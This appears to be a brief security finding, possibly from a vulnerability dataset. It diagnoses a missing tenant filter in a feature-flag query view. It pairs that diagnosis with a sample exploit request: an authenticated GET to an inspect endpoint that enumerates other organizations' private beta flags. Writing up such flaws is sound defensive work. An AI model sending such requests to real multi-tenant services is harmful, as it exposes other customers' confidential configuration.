diagnosis: The view queries TenantConfigProfile using PostgreSQL feature_flags__has_keys across the entire table without restricting results to request.user.organization. An attacker can discover active private beta feature flags, internal rollout toggles, and feature configurations belonging to other organizations.
exploit_request:
GET /api/system/configs/inspect/?keys=beta_ai_assistant,export_crypto_keys HTTP/1.1
Host: platform.saascore.net
Authorization: Bearer <customer_token>
